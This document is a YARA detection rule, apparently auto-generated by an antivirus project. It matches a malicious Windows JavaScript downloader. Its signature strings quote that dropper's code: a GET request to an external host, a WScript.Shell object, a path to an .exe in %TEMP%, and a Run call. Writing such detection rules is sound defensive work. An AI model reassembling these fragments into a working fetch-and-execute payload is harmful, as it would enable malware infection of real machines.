rule sig_20160330_3a6b81580cbfa49a8db2369d10176b3d {
  meta:
    description = "datamaliciousorder - file 20160330_3a6b81580cbfa49a8db2369d10176b3d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a2688de3afb6bc9e1c32bc5dd91881aeb9164031112a5f0e97ddc5f9ae8cc32"

  strings:
    $s1  = "YK[W](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var H1 = function TB() {return WScript[D0](\"WScript\"+\".Shell\");}(), CR = 11;" fullword ascii
    $s3  = "function MS(M, K0){W0 = W0 * 1; return M - K0;};" fullword ascii
    $s4  = "if (YK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EV(){return AB + \"\";};" fullword ascii
    $s6  = "function T() {return H1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Bks2tJ0T.ex\" + \"e\";};" fullword ascii
    $s7  = "function FY() {return ((SS == true) && (SS == WJ)) ? 1 : W0;};" fullword ascii
    $s8  = "function D(ZG){H1[\"Run\"](ZG, W0, W0);};" fullword ascii
    $s9  = "var H0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function A(){return 22;};" fullword ascii
    $s11 = "}while (UN);" fullword ascii
    $s12 = "function FM(KP) {var KV = (1, 2, 3, 4, 5, KP); return KV;};" fullword ascii
    $s13 = "return MS(S, ZA);" fullword ascii
    $s14 = "function I()" fullword ascii
    $s15 = "function E(){return D0;};" fullword ascii
    $s16 = "var WJ = false;" fullword ascii
    $s17 = "SS = true; " fullword ascii
    $s18 = "WJ = true; " fullword ascii
    $s19 = "var R1 = false;" fullword ascii
    $s20 = "var SS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}